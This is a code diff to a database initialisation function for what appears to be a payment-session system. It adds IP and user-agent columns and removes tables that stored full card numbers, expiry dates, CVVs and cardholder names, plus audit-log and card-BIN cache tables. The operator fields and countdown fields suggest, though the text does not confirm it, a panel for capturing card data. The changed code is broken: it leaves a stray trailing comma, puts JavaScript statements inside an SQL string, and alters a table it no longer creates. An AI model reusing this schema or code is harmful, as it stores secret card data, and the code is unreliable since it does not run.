@@ -55,38 +55,13 @@ export async function initTables() {
       countdown_seconds INTEGER DEFAULT 0,
       pending_at TEXT,
       last_card_info TEXT DEFAULT '{}',
+      ip TEXT DEFAULT '',
+      ua TEXT DEFAULT '',
       created_at TEXT DEFAULT (datetime('now')),
-      updated_at TEXT DEFAULT (datetime('now'))
     );
-    CREATE TABLE IF NOT EXISTS card_history (
-      id INTEGER PRIMARY KEY AUTOINCREMENT,
-      session_id TEXT REFERENCES payment_sessions(id) ON DELETE CASCADE,
-      card_number TEXT,
-      card_type TEXT,
-      card_level TEXT,
-      bank_name TEXT,
-      expiry TEXT,
-      cvv TEXT,
-      card_holder TEXT,
-      created_at TEXT DEFAULT (datetime('now'))
-    );
-    CREATE TABLE IF NOT EXISTS audit_logs (
-      id INTEGER PRIMARY KEY AUTOINCREMENT,
-      session_id TEXT,
-      operator_id TEXT,
-      action TEXT,
-      message TEXT,
-      created_at TEXT DEFAULT (datetime('now'))
-    );
-    CREATE TABLE IF NOT EXISTS bin_cache (
-      bin TEXT PRIMARY KEY,
-      brand TEXT,
-      type TEXT,
-      issuer TEXT,
-      country TEXT,
-      raw_json TEXT,
-      cached_at TEXT DEFAULT (datetime('now'))
-    );
+    -- Add ip/ua columns if upgrading from old schema
+    try { db.run('ALTER TABLE payment_sessions ADD COLUMN ip TEXT DEFAULT \'\''); } catch(e) {}
+    try { db.run('ALTER TABLE payment_sessions ADD COLUMN ua TEXT DEFAULT \'\''); } catch(e) {}
   `);
   // Add raw_json column if upgrading from old schema
   try { db.run('ALTER TABLE bin_cache ADD COLUMN raw_json TEXT'); } catch(e) {}
